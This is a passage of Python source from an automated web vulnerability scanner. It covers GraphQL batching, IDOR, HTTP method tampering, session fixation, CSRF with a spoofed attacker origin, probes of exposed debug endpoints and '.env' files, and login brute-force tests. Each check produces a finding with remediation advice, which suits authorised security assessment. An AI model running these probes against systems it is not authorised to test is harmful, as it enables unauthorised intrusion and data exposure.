    # Test batch query attack
    batch_query = '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
    try:
        r = sess.post(found_gql, data=batch_query,
                      headers={"Content-Type": "application/json"}, timeout=timeout)
        if r.status_code == 200 and isinstance(json.loads(r.text), list):
            out.add_finding(
                title="GraphQL Batch Query Attack Possible",
                url=found_gql, port=target["port"], risk="MEDIUM",
                description="GraphQL accepts batched queries, which can be used to bypass rate limiting.",
                output=r.text[:300], sources="fracture-graphql",
                service=target["scheme"], affected=found_gql,
                owasp="A05:2025 Security Misconfiguration", nist="SC-5",
                remediation="Implement query complexity limits and disable batching if not required.",
            )
    except Exception:
        pass

    vc.status(phase, "GraphQL", "running", "Field suggestions", 2, 3)
    # Field suggestion detection
    try:
        r = sess.post(found_gql,
                      data='{"query":"{doesNotExist}"}',
                      headers={"Content-Type": "application/json"}, timeout=timeout)
        if "Did you mean" in r.text or "suggestion" in r.text.lower():
            out.add_finding(
                title="GraphQL Field Suggestions Enabled",
                url=found_gql, port=target["port"], risk="LOW",
                description="GraphQL returns field name suggestions on typos, which can aid schema enumeration.",
                output=r.text[:300], sources="fracture-graphql",
                service=target["scheme"], affected=found_gql,
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation="Disable field suggestions in production.",
            )
    except Exception:
        pass

    vc.status(phase, "GraphQL", "complete", "Done", 3, 3)
    vc.log("[graphql] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 11: Auth Recon
# ─────────────────────────────────────────────
def _phase_auth_recon(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager, auth_sess: requests.Session,
                      crawl_data: dict) -> dict:
    phase   = "auth_recon"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Auth Recon", "running", "Crawling authenticated", 0, 3)

    # Crawl with authenticated session
    auth_crawl = _phase_crawl.__wrapped__ if hasattr(_phase_crawl, "__wrapped__") else None
    # Re-crawl with auth session
    visited:    set  = set()
    queue_urls: list = [(url, 0)]
    auth_forms: list = []
    auth_links: list = []
    page_count        = 0
    max_pages = cfg.get("crawl_max_pages", 150)
    max_depth = cfg.get("crawl_depth", 3)

    while queue_urls and page_count < max_pages:
        current_url, depth = queue_urls.pop(0)
        _norm_cur = current_url.rstrip("/")
        if _norm_cur in visited:
            continue
        visited.add(_norm_cur)
        page_count += 1
        data = _crawl_page(current_url, auth_sess, timeout, url)
        if data["error"]:
            continue
        auth_forms.extend(data["forms"])
        auth_links.extend(data["links"])
        if depth < max_depth:
            for link in data["links"]:
                _lp = urllib.parse.urlparse(link).path or ""
                if (link.rstrip("/") not in visited
                        and _same_origin(url, link)
                        and not _LOGOUT_PATH_RE.search(_lp)):
                    queue_urls.append((link, depth + 1))

    vc.log(f"[auth_recon] Authenticated crawl: {page_count} pages", "INFO")
    vc.status(phase, "Auth Recon", "running", "Interesting endpoints", 1, 3)

    # Find admin-only endpoints
    _ar_scope = {target.get("hostname") or urllib.parse.urlparse(url).hostname or ""}
    for link in set(auth_links):
        if (_INTERESTING_PATH_RE.search(link)
                and _is_in_scope_url(link, _ar_scope)
                and _is_valid_endpoint_url(link)):
            out.add_finding(
                title="Authenticated Interesting Endpoint",
                url=link, port=target["port"], risk="INFO",
                description=f"Interesting endpoint accessible while authenticated: {link}",
                sources="fracture-auth-recon", service=target["scheme"],
                affected=link,
                owasp="A01:2025 Broken Access Control", nist="AC-3",
                remediation="Verify this endpoint enforces proper authorisation.",
            )

    vc.status(phase, "Auth Recon", "running", "User ID extraction", 2, 3)
    # Look for numeric/UUID IDs in links
    _id_re = re.compile(r'/(\d+)(?:/|$|[?#])')
    resource_ids: list = []
    for link in set(auth_links):
        for m in _id_re.finditer(link):
            resource_ids.append({"url": link, "id": int(m.group(1))})

    vc.status(phase, "Auth Recon", "complete", "Done", 3, 3)
    vc.log("[auth_recon] Phase complete", "SUCCESS")
    return {"forms": auth_forms, "links": list(set(auth_links)), "resource_ids": resource_ids}


# ─────────────────────────────────────────────
# Phase 12: Authorization (IDOR)
# ─────────────────────────────────────────────
def _phase_authorization(target: dict, cfg: dict, pm: ProgressManager,
                          out: OutputManager, auth_sess: requests.Session,
                          auth_recon_data: dict) -> None:
    phase   = "authorization"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    resource_ids = auth_recon_data.get("resource_ids", [])
    vc.status(phase, "Authorization Testing", "running", "IDOR testing", 0, len(resource_ids))

    for idx, res in enumerate(resource_ids[:50]):
        res_url = res["url"]
        res_id  = res["id"]
        vc.status(phase, "Authorization Testing", "running", f"ID {res_id}", idx, len(resource_ids))

        # Test adjacent IDs
        for test_id in [res_id - 1, res_id + 1, res_id + 100]:
            if test_id <= 0:
                continue
            test_url = re.sub(r'/' + str(res_id) + r'(?=/|$|[?#])',
                               '/' + str(test_id), res_url, count=1)
            try:
                r = auth_sess.get(test_url, timeout=timeout)
                if r.status_code == 200 and len(r.text) > 100:
                    out.add_finding(
                        title="Broken Object Level Authorization (IDOR / BOLA)",
                        url=test_url, port=target["port"], risk="CRITICAL",
                        description="The application or API exposes user-controlled object identifiers and does not verify whether the authenticated user has authorisation to access the referenced object, enabling horizontal privilege escalation.",
                        output=f"Original: {res_url}\nManipulated: {test_url}\nStatus: {r.status_code}",
                        sources="fracture-authorization", service=target["scheme"],
                        affected=test_url,
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Enforce server-side authorisation checks for every object access request, verifying ownership or explicit permission before returning or modifying data; do not rely on obscure IDs as an access control mechanism.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[authorization] IDOR: {test_url}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "Authorization Testing", "running", "HTTP method tampering", len(resource_ids), len(resource_ids))
    # Method tampering
    auth_links = auth_recon_data.get("links", [])
    for link in auth_links[:20]:
        for method in ("PUT", "DELETE", "PATCH"):
            try:
                r = auth_sess.request(method, link, timeout=timeout)
                if r.status_code not in (405, 404, 400, 401, 403, 501):
                    out.add_finding(
                        title=f"HTTP Method Tampering: {method} Accepted",
                        url=link, port=target["port"], risk="MEDIUM",
                        description=f"The endpoint {link} accepted HTTP {method} (status {r.status_code}).",
                        output=f"{method} {link} → {r.status_code}",
                        sources="fracture-authorization", service=target["scheme"],
                        affected=link,
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Restrict HTTP methods to only those required for each endpoint.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[authorization] Method tampering {method} on {link}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Authorization Testing", "complete", "Done", len(resource_ids), len(resource_ids))
    vc.log("[authorization] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 13: Session
# ─────────────────────────────────────────────
def _phase_session(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, auth_sess: requests.Session) -> None:
    phase   = "session"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Session Analysis", "running", "Token entropy", 0, 4)

    # 1. Analyse session token entropy
    for cookie in auth_sess.cookies:
        val = cookie.value or ""
        if len(val) < 8:
            continue
        # Check for low-entropy tokens
        unique_chars = len(set(val))
        if unique_chars < 8 and len(val) < 20:
            out.add_finding(
                title="Low-Entropy Session Token",
                url=url, port=target["port"], risk="HIGH",
                description=f"Session cookie '{cookie.name}' has low entropy (value length={len(val)}, unique chars={unique_chars}).",
                output=f"Cookie: {cookie.name}={val[:20]}...",
                sources="fracture-session", service=target["scheme"],
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Use cryptographically secure random session token generators (e.g. 128-bit+).",
            )

        # Check for sequential/predictable tokens
        if val.isdigit():
            out.add_finding(
                title="Potentially Predictable Session Token",
                url=url, port=target["port"], risk="HIGH",
                description=f"Session cookie '{cookie.name}' consists entirely of digits, which may indicate a sequential or predictable value.",
                output=f"Cookie: {cookie.name}={val[:20]}",
                sources="fracture-session", service=target["scheme"],
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Use cryptographically secure random session identifiers.",
            )

    vc.status(phase, "Session Analysis", "running", "Session fixation", 1, 4)
    # 2. Session fixation — check if server accepts user-provided session ID
    fixed_id = "fracture_fixed_session_12345678"
    try:
        test_sess = _make_session(cfg)
        # Find a session cookie name
        session_cookie_name = None
        for cookie in auth_sess.cookies:
            if re.search(r'sess|token|auth|sid', cookie.name, re.I):
                session_cookie_name = cookie.name
                break
        if session_cookie_name:
            test_sess.cookies.set(session_cookie_name, fixed_id)
            r = test_sess.get(url, timeout=timeout)
            returned_val = test_sess.cookies.get(session_cookie_name, "")
            if returned_val == fixed_id:
                out.add_finding(
                    title="Session Fixation Vulnerability",
                    url=url, port=target["port"], risk="HIGH",
                    description=f"The server accepted and returned the user-provided session ID '{fixed_id}', indicating session fixation vulnerability.",
                    output=f"Set cookie: {session_cookie_name}={fixed_id}\nReturned: {returned_val}",
                    sources="fracture-session", service=target["scheme"],
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    remediation="Regenerate session IDs upon authentication. Reject externally provided session IDs.",
                    http_code=r.status_code,
                )
                vc.log("[session] Session fixation confirmed", "SUCCESS")
    except Exception:
        pass

    vc.status(phase, "Session Analysis", "running", "Logout invalidation", 2, 4)
    # 3. Check logout invalidation
    # IMPORTANT: Never use auth_sess itself for logout probing — hitting /logout
    # on the live session object invalidates the server-side session and breaks all
    # subsequent authenticated phases.  Use two disposable clones instead:
    #   logout_probe  — hits the logout endpoint (expendable)
    #   old_sess      — tests whether the pre-logout cookies still work
    logout_paths = ["/logout", "/signout", "/auth/logout", "/session/destroy", "/api/logout"]
    for lpath in logout_paths:
        try:
            # Clone auth_sess cookies into a disposable probe session
            pre_cookies = dict(auth_sess.cookies)
            logout_probe = _make_session(cfg)
            for k, v in pre_cookies.items():
                logout_probe.cookies.set(k, v)
            r = logout_probe.get(url + lpath, timeout=timeout, allow_redirects=False)
            if r.status_code in (200, 302):
                # Try to use old session cookies to confirm server-side invalidation
                old_sess = _make_session(cfg)
                for k, v in pre_cookies.items():
                    old_sess.cookies.set(k, v)
                r2 = old_sess.get(url, timeout=timeout)
                if r2.status_code == 200 and not re.search(r'login|sign.?in|auth', r2.url, re.I):
                    out.add_finding(
                        title="Session Not Invalidated After Logout",
                        url=url + lpath, port=target["port"], risk="HIGH",
                        description="Session cookies remain valid after logout. Old sessions can be reused.",
                        output=f"Logout: {url + lpath}\nOld session still valid: {r2.url}",
                        sources="fracture-session", service=target["scheme"],
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="SC-23",
                        remediation="Invalidate session server-side on logout. Do not rely solely on client-side cookie deletion.",
                        http_code=r2.status_code,
                    )
                    vc.log("[session] Session not invalidated after logout", "SUCCESS")
            break
        except Exception:
            pass

    vc.status(phase, "Session Analysis", "complete", "Done", 4, 4)
    vc.log("[session] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 14: CSRF
# ─────────────────────────────────────────────
def _phase_csrf(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager, auth_sess: requests.Session,
                auth_recon_data: dict) -> None:
    phase   = "csrf"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = auth_recon_data.get("forms", [])
    vc.status(phase, "CSRF Testing", "running", "Form analysis", 0, len(forms))

    for idx, form in enumerate(forms[:30]):
        action = form.get("action", url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        vc.status(phase, "CSRF Testing", "running", f"Form {idx}", idx, len(forms))

        if method != "POST":
            continue

        # Check for CSRF token fields
        csrf_fields = [i["name"] for i in inputs
                       if re.search(r'csrf|token|nonce|_token|authenticity', i["name"], re.I)]
        samesite_protected = False
        for cookie in auth_sess.cookies:
            # SameSite is difficult to check without raw header — just note presence
            pass

        if not csrf_fields:
            # No CSRF token — attempt a cross-origin POST
            data = {i["name"]: "fracture_csrf_test" for i in inputs if i.get("name")}
            try:
                test_sess = _make_session(cfg)  # unauthenticated cross-origin session
                # Copy auth cookies to simulate credential forwarding
                for cookie in auth_sess.cookies:
                    test_sess.cookies.set(cookie.name, cookie.value)
                r = test_sess.post(
                    action, data=data, timeout=timeout,
                    headers={"Origin": "https://evil.attacker.com",
                             "Referer": "https://evil.attacker.com/"}
                )
                if r.status_code in (200, 302):
                    out.add_finding(
                        title="Cross-Site Request Forgery (CSRF) — Missing Token",
                        url=action, port=target["port"], risk="HIGH",
                        description=f"State-changing form at {action} lacks a CSRF token. A cross-origin POST was accepted.",
                        output=f"Form action: {action}\nInputs: {[i['name'] for i in inputs]}",
                        sources="fracture-csrf", service=target["scheme"],
                        affected=action,
                        owasp="A04:2025 Insecure Design", nist="SI-10",
                        remediation="Implement synchronised CSRF tokens on all state-changing forms. Use SameSite=Lax/Strict cookies.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[csrf] CSRF: no token at {action}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "CSRF Testing", "complete", "Done", len(forms), len(forms))
    vc.log("[csrf] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 15: Cross-User (requires auth2)
# ─────────────────────────────────────────────
def _phase_cross_user(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager,
                      auth_sess: requests.Session,
                      auth2_sess: requests.Session,
                      auth_recon_data: dict) -> None:
    phase    = "cross_user"
    url      = target["url"]
    timeout  = cfg.get("timeout", 10)
    resource_ids = auth_recon_data.get("resource_ids", [])
    links        = auth_recon_data.get("links", [])
    vc.status(phase, "Cross-User Testing", "running", "Resource enumeration", 0, len(resource_ids))

    for idx, res in enumerate(resource_ids[:50]):
        res_url = res["url"]
        vc.status(phase, "Cross-User Testing", "running", f"Resource {res['id']}", idx, len(resource_ids))
        try:
            # Access user1's resource as user2
            r = auth2_sess.get(res_url, timeout=timeout)
            if r.status_code == 200 and len(r.text) > 100:
                out.add_finding(
                    title="Cross-User Data Leakage (IDOR)",
                    url=res_url, port=target["port"], risk="CRITICAL",
                    description=f"User2 can access User1's resource at {res_url} (HTTP 200). This is a confirmed cross-user authorisation bypass.",
                    output=f"Resource: {res_url}\nUser2 response: {r.status_code} ({len(r.text)} bytes)",
                    sources="fracture-cross-user", service=target["scheme"],
                    affected=res_url,
                    owasp="A01:2025 Broken Access Control", nist="AC-3",
                    remediation="Implement and enforce object-level authorisation checks. Verify ownership for every resource access.",
                )
                vc.log(f"[cross_user] Cross-user leakage: {res_url}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Cross-User Testing", "running", "API endpoint testing", len(resource_ids), len(resource_ids))
    # Test authenticated API endpoints
    for link in links[:30]:
        if re.search(r'/api/', link, re.I):
            try:
                r1 = auth_sess.get(link, timeout=timeout)
                r2 = auth2_sess.get(link, timeout=timeout)
                if r1.status_code == 200 and r2.status_code == 200:
                    # If both users see the same data, check for user-specific content
                    if r1.text == r2.text and len(r1.text) > 50:
                        out.add_finding(
                            title="API Endpoint Returns Same Data for All Users",
                            url=link, port=target["port"], risk="MEDIUM",
                            description=f"API endpoint {link} returns identical data for different authenticated users — may indicate missing user-scope filtering.",
                            output=f"User1 == User2 response ({len(r1.text)} bytes)",
                            sources="fracture-cross-user", service=target["scheme"],
                            affected=link,
                            owasp="A01:2025 Broken Access Control", nist="AC-3",
                            remediation="Scope API responses to the authenticated user. Do not return data for all users.",
                        )
            except Exception:
                pass

    vc.status(phase, "Cross-User Testing", "complete", "Done", len(resource_ids), len(resource_ids))
    vc.log("[cross_user] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 10b: Logging & Monitoring (OWASP A09)
# ─────────────────────────────────────────────
_LOG_ENDPOINT_PATTERNS = re.compile(
    r'/admin|/debug|/trace|/log|/monitor|/status|/health|/actuator|/metrics|'
    r'/info|/env|/config|/console|/shell|/management|/api-docs|/swagger', re.I
)
_STACK_TRACE_RE = re.compile(
    r'Traceback|stack.?trace|Exception in|at com\.|at org\.|at java\.|'
    r'StackTrace|Internal Server Error|sqlstate|SQLSTATE|ORA-\d|mysql_', re.I
)
_DEBUG_HEADER_RE = re.compile(r'X-Debug|X-Trace|X-Request-Id|X-Powered-By', re.I)


def _phase_logging_monitoring(target: dict, cfg: dict, pm: ProgressManager,
                               out: OutputManager, sess: requests.Session,
                               crawl_data: dict) -> None:
    """Phase 10b: Security Logging & Monitoring Failures — OWASP A09:2025."""
    phase   = "logging_monitoring"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    links   = crawl_data.get("links", [])

    vc.status(phase, "Logging & Monitoring", "running", "Probing admin/debug endpoints", 0, 4)

    # 1. Exposed admin/debug/monitoring endpoints
    probe_paths = [
        "/actuator", "/actuator/env", "/actuator/heapdump", "/actuator/mappings",
        "/actuator/metrics", "/actuator/logfile", "/actuator/httptrace",
        "/debug", "/trace", "/.env", "/config",
        "/admin/logs", "/logs", "/log", "/error-log",
        "/server-status", "/server-info",
    ]
    for path in probe_paths:
        probe_url = url.rstrip("/") + path
        try:
            r = sess.get(probe_url, timeout=timeout, allow_redirects=False)
            if r and r.status_code == 200:
                out.add_finding(
                    title=f"Exposed Admin/Debug Endpoint: {path}",
                    url=probe_url, port=target["port"], risk="HIGH",
                    description=(
                        f"The endpoint '{path}' returned HTTP 200 without authentication. "
                        f"Exposed diagnostic endpoints can reveal environment variables, "
                        f"heap dumps, log files, and configuration data."
                    ),
                    output=f"GET {probe_url} → HTTP {r.status_code}\n{r.text[:500]}",
                    sources="fracture-logging", service=target["scheme"],
                    affected=probe_url,
                    owasp="A09:2025 Security Logging and Monitoring Failures", nist="AU-9",
                    remediation=(
                        "Restrict admin/actuator endpoints to localhost or protected networks. "
                        "Require authentication for all diagnostic endpoints."
                    ),
                )
                vc.log(f"[logging_monitoring] Exposed endpoint: {probe_url}", "SUCCESS")
        except Exception:
            pass

    # 2. Error message verbosity — trigger errors and check for stack traces
    vc.status(phase, "Logging & Monitoring", "running", "Error verbosity check", 1, 4)
    error_triggers = [
        url + "/'",          # SQL char
        url + "/nonexistent_fracture_path_xyz_12345",
        url + "?" + "fracture_test_param=<script>",
        url + "/admin",
    ]
    for eu in error_triggers:
        try:
            r = sess.get(eu, timeout=timeout, allow_redirects=True)
            if r and r.status_code in (500, 503) and _STACK_TRACE_RE.search(r.text):
                out.add_finding(
                    title="Verbose Error Messages — Stack Trace Disclosed",
                    url=eu, port=target["port"], risk="MEDIUM",
                    description=(
                        f"The server returned a verbose error at {eu} (HTTP {r.status_code}) "
                        f"containing stack trace or database error details. This leaks "
                        f"implementation details that aid attackers."
                    ),
                    output=f"GET {eu} → HTTP {r.status_code}\n{r.text[:1000]}",
                    sources="fracture-logging", service=target["scheme"],
                    affected=eu,
                    owasp="A09:2025 Security Logging and Monitoring Failures", nist="AU-3",
                    remediation=(
                        "Configure production error pages to display generic messages only. "
                        "Log detailed errors server-side, never expose them to clients."
                    ),
                )
                vc.log(f"[logging_monitoring] Stack trace: {eu}", "SUCCESS")
        except Exception:
            pass

    # 3. Debug headers in responses
    vc.status(phase, "Logging & Monitoring", "running", "Debug header check", 2, 4)
    try:
        r = sess.get(url, timeout=timeout)
        if r:
            debug_hdrs = [h for h in r.headers if _DEBUG_HEADER_RE.search(h)]
            if debug_hdrs:
                out.add_finding(
                    title="Header Data Leakage: Debug/Trace Headers",
                    url=url, port=target["port"], risk="LOW",
                    description=(
                        f"Response headers include diagnostic or debug headers: "
                        f"{', '.join(debug_hdrs)}. These reveal implementation details "
                        "that may assist attackers in identifying instrumentation, tracing systems, "
                        "or internal infrastructure."
                    ),
                    output=f"Headers: {', '.join(f'{h}: {r.headers[h]}' for h in debug_hdrs)}",
                    sources="fracture-logging", service=target["scheme"],
                    affected=url,
                    owasp="A09:2025 Security Logging and Monitoring Failures", nist="AU-3",
                    remediation=(
                        "Remove debug and trace headers from production responses. "
                        "If X-Request-Id is used for correlation, ensure it is a random UUID "
                        "and does not echo internal trace IDs or stack paths."
                    ),
                    command=f"python3 -c \"import requests; r=requests.get('{url}'); "
                            f"print({{'debug_hdrs': [h for h in r.headers if any(k in h.lower() for k in ['debug','trace','x-request','x-powered'])]}})\"",
                )
    except Exception:
        pass

    # 4. Insufficient logging probe — check if repeated failed auth attempts are detected
    vc.status(phase, "Logging & Monitoring", "running", "Auth logging probe", 3, 4)
    login_url = cfg.get("auth", {}).get("login_url", "")
    if login_url:
        fail_responses = []
        for _ in range(5):
            try:
                r = sess.post(login_url, json={"username": "fracture_logging_probe",
                                               "password": "wrong_password_xyz"}, timeout=timeout)
                fail_responses.append(r.status_code)
            except Exception:
                pass
        if len(fail_responses) == 5 and all(s in (200, 302, 401) for s in fail_responses):
            # All 5 failed logins were accepted without lockout indication
            out.add_finding(
                title="Insufficient Auth Failure Logging / No Brute-Force Detection",
                url=login_url, port=target["port"], risk="MEDIUM",
                description=(
                    f"Five consecutive failed login attempts to {login_url} were accepted "
                    f"without triggering a lockout, rate limit, or captcha response. "
                    f"Insufficient logging may mean brute-force attempts go undetected."
                ),
                output=(
                    f"5 failed logins to {login_url}\n"
                    f"Status codes: {fail_responses}"
                ),
                sources="fracture-logging", service=target["scheme"],
                affected=login_url,
                owasp="A09:2025 Security Logging and Monitoring Failures", nist="AU-12",
                remediation=(
                    "Implement brute-force detection and account lockout after N failed attempts. "
                    "Log all authentication failures with IP, timestamp, and username. "
                    "Alert on anomalous login failure patterns."
                ),
            )
            vc.log(f"[logging_monitoring] No brute-force protection: {login_url}", "SUCCESS")

    # 5. Prometheus / metrics endpoint exposure
    vc.status(phase, "Logging & Monitoring", "running", "Metrics endpoints", 4, 7)
    _metrics_paths = ["/metrics", "/prometheus", "/prometheus/metrics",
                      "/internal/metrics", "/ops/metrics"]
    for mpath in _metrics_paths:
        murl = url.rstrip("/") + mpath
        try:
            r = sess.get(murl, timeout=timeout, allow_redirects=False)
            if r and r.status_code == 200 and re.search(r'^#\s+HELP\s+|^#\s+TYPE\s+|\bprocess_cpu\b|\bgo_goroutines\b', r.text, re.M):
                out.add_finding(
                    title="Exposed Metrics Endpoint with Sensitive Data",
                    url=murl, port=target["port"], risk="MEDIUM",
                    description=(f"A Prometheus-format metrics endpoint was found at {murl} without "
                                 f"authentication. It exposes internal process metrics, request counters, "
                                 f"and potentially sensitive timing and resource data."),
                    output=f"GET {murl} → HTTP {r.status_code}\n{r.text[:500]}",
                    sources="fracture-logging", service=target["scheme"],
                    affected=murl, owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation="Restrict /metrics and /prometheus endpoints to localhost or a monitoring network. Require authentication.",
                )
                vc.log(f"[logging_monitoring] Prometheus metrics: {murl}", "SUCCESS")
        except Exception:
            pass

    # 6. JSONP endpoint detection via callback parameter on discovered paths
    vc.status(phase, "Logging & Monitoring", "running", "JSONP endpoints (recon)", 5, 7)
    _jsonp_probe_paths = ["/api/user", "/api/data", "/data", "/export", "/feed",
                          "/api/profile", "/user/info", "/api/json"]
    _jsonp_wrap_re2 = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(', re.M)
    for jpath in _jsonp_probe_paths:
        jurl = url.rstrip("/") + jpath + "?callback=fracture_jsonp_check"
        try:
            r = sess.get(jurl, timeout=timeout, allow_redirects=False)
            if r and r.status_code == 200:
                if "fracture_jsonp_check" in r.text and _jsonp_wrap_re2.search(r.text[:100]):
                    out.add_finding(
                        title="JSONP Endpoint — Cross-Origin Data Leakage",
                        url=url.rstrip("/") + jpath, port=target["port"], risk="HIGH",
                        description=(f"JSONP endpoint found at {jpath}. The 'callback' parameter is "
                                     f"reflected as a JavaScript function name wrapping the response body. "
                                     f"An attacker can embed a <script> tag to exfiltrate the response from any domain."),
                        output=f"GET {jurl} → HTTP {r.status_code}\n{r.text[:300]}",
                        sources="fracture-logging", service=target["scheme"],
                        affected=url.rstrip("/") + jpath,
                        owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                        remediation="Remove JSONP support and use CORS with an origin allowlist instead.",
                    )
                    vc.log(f"[logging_monitoring] JSONP endpoint: {jpath}", "SUCCESS")
        except Exception:
            pass

    # 7. Missing Cache-Control on sensitive pages
    vc.status(phase, "Logging & Monitoring", "running", "Cache-Control on sensitive pages", 6, 7)
    _sensitive_paths_cc = ["/login", "/profile", "/account", "/dashboard",
                           "/admin", "/settings", "/password", "/reset"]
    for spath in _sensitive_paths_cc:
        surl = url.rstrip("/") + spath
        try:
            r = sess.get(surl, timeout=timeout, allow_redirects=True)
            if r and r.status_code == 200:
                cc = r.headers.get("Cache-Control", "")
                pragma = r.headers.get("Pragma", "")
                if not re.search(r'no-store|no-cache|private|must-revalidate', cc, re.I) \
                        and "no-cache" not in pragma.lower():
                    out.add_finding(
                        title="Missing Cache-Control on Sensitive Page",
                        url=surl, port=target["port"], risk="LOW",
                        description=(f"The sensitive page {spath} is missing Cache-Control: no-store / no-cache. "
                                     f"Browsers and intermediate proxies may cache the response, "
                                     f"exposing sensitive data to users of shared computers."),
                        output=f"GET {surl} → HTTP {r.status_code}\nCache-Control: {cc or '(absent)'}\nPragma: {pragma or '(absent)'}",
                        sources="fracture-logging", service=target["scheme"],
                        affected=surl, owasp="A05:2025 Security Misconfiguration", nist="SC-28",
                        remediation="Add 'Cache-Control: no-store, no-cache, private' and 'Pragma: no-cache' to all authenticated and sensitive pages.",
                    )
                    vc.log(f"[logging_monitoring] Missing Cache-Control: {spath}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Logging & Monitoring", "complete", "Done", 7, 7)
    vc.log("[logging_monitoring] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 7b: Account Lockout (alongside auth_bypass)
# ─────────────────────────────────────────────
_LOCKOUT_USERNAME_FIELDS = re.compile(r'user|email|login|name|account', re.I)
_LOCKOUT_PASSWORD_FIELDS = re.compile(r'pass|pwd|secret|credential', re.I)


def _phase_account_lockout(target: dict, cfg: dict, pm: ProgressManager,
                            out: OutputManager, sess: requests.Session,
                            crawl_data: dict) -> None:
    """Phase 7b: Account lockout and brute-force protection testing."""
    phase   = "account_lockout"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])

    vc.status(phase, "Account Lockout", "running", "Identifying login forms", 0, 3)

    # Identify login forms
    login_forms = []
    for form in forms:
        inputs = form.get("inputs", [])
        has_user = any(_LOCKOUT_USERNAME_FIELDS.search(i.get("name", "") + i.get("type", ""))
                       for i in inputs)
        has_pass = any(i.get("type", "").lower() == "password" or
                       _LOCKOUT_PASSWORD_FIELDS.search(i.get("name", ""))
                       for i in inputs)
        if has_user and has_pass:
            login_forms.append(form)

    # Also try configured login URL
    login_url = cfg.get("auth", {}).get("login_url", "")
    if login_url and not login_forms:
        login_forms = [{"action": login_url, "method": "POST",
                        "inputs": [{"name": "username"}, {"name": "password", "type": "password"}]}]

    vc.status(phase, "Account Lockout", "running", "Brute-force simulation", 1, 3)
    for form in login_forms[:3]:
        action = form.get("action", url)
        method = form.get("method", "POST").upper()
        inputs = form.get("inputs", [])

        user_field = next(
            (i["name"] for i in inputs if _LOCKOUT_USERNAME_FIELDS.search(
                i.get("name", "") + i.get("type", ""))), "username"
        )
        pass_field = next(
            (i["name"] for i in inputs
             if i.get("type", "").lower() == "password" or
             _LOCKOUT_PASSWORD_FIELDS.search(i.get("name", ""))), "password"
        )

        status_codes: list = []
        probe_responses: list = []  # requests.Response objects for evidence
        _last_r = None
        for attempt in range(10):
            data = {user_field: "fracture_test_user", pass_field: f"wrong_pass_{attempt}"}
            try:
                _last_r = (sess.post(action, data=data, timeout=timeout, allow_redirects=True)
                           if method == "POST"
                           else sess.get(action, params=data, timeout=timeout))
                status_codes.append(_last_r.status_code)
                probe_responses.append(_last_r)
                # Check for lockout/captcha indicators
                if re.search(r'locked|captcha|too many|rate.limit|try.again.later|'
                             r'account.*disabled|temporarily.*unavail', _last_r.text, re.I):
                    vc.log(f"[account_lockout] Lockout triggered after {attempt+1} attempts", "INFO")
                    break
            except Exception:
                pass

        if len(status_codes) >= 10:
            # All 10 requests succeeded without lockout — capture evidence
            evidence_files: list = []
            for _ai, _ar in enumerate(probe_responses):
                try:
                    _rq, _rp = _save_http_evidence(
                        out, phase, f"brute_probe_{_ai + 1:02d}",
                        _ar, endpoint_url=action, method=method)
                    evidence_files.extend([_rq, _rp])
                except Exception:
                    pass
            out.add_finding(
                title="Missing Rate Limiting / Brute-Force Protection",
                url=action, port=target["port"], risk="HIGH",
                description="Authentication and sensitive API endpoints do not enforce request rate limits, account lockout, or CAPTCHA, allowing unlimited brute-force or credential-stuffing attempts.",
                output=(
                    f"Form: {action}\nAttempts: {len(status_codes)}\n"
                    f"Status codes: {status_codes}\n"
                    + "\n".join(
                        f"  [{i+1}] HTTP {r.status_code} ({len(r.content)} bytes)"
                        for i, r in enumerate(probe_responses)
                    )
                ),
                output_file=",".join(evidence_files),
                sources="fracture-account-lockout", service=target["scheme"],
                affected=action,
                owasp="A07:2025 Identification and Authentication Failures", nist="AC-7",
                remediation="Implement per-IP and per-account rate limiting with progressive delays or lockout on all authentication endpoints; add CAPTCHA for interactive login flows; alert on anomalous request volumes.",
                http_code=_last_r.status_code if _last_r is not None else 0,
            )
            vc.log(f"[account_lockout] No lockout: {action} ({len(status_codes)} attempts)", "SUCCESS")

    vc.status(phase, "Account Lockout", "complete", "Done", 3, 3)
    vc.log("[account_lockout] Phase complete", "SUCCESS")


# =============================================================================
# Phase 16: Open Redirect
# =============================================================================

def _phase_open_redirect(target: dict, cfg: dict, pm: ProgressManager,
                         out: OutputManager, sess: requests.Session,
                         crawl_data: dict) -> None:
    """Phase 16: Open redirect testing on URL-like parameters."""
    phase   = "open_redirect"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
